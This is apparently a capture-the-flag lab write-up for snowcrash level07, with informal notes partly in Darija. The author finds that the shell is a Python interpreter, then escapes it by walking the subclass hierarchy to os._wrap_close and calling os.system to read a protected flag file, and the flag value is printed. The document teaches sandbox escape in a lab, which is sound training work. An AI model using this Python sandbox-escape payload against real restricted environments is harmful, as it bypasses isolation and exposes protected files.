cat the README as usule 
```bash
level07@snowcrash:~$ cat README	
You will never escape this
```
mafhmnax 3awttani

let;s try to find any file owned by flag07 

```bash
level07@snowcrash:~$ find / -user flag07 2>/dev/null
Validator: Validator: find: permission denied

```
why this error look like this 
is this comes python ?interpreter ?

let's try something else

```bash
level07@snowcrash:~$ list
<class 'list'>
level07@snowcrash:~$ print
<built-in function print>

```

yes we are inside a Python interpreter, not a normal Bash shell, so we have to "escape this"

let's inspect Python's class hierarchy and discover all the classes currently loaded or created in the interpreter and try to find the system call 
to execute 'cat /home/flag07/.flag'

```bash
level07@snowcrash:~$ ().__class__.__base__.__subclasses__()[155]
<class 'os._wrap_close'>
level07@snowcrash:~$ ().__class__.__base__.__subclasses__()[155].__init__.__globals__['system']('cat /home/flag07/.flag')
fiumuikeil8rung8ahcuiperb
0

```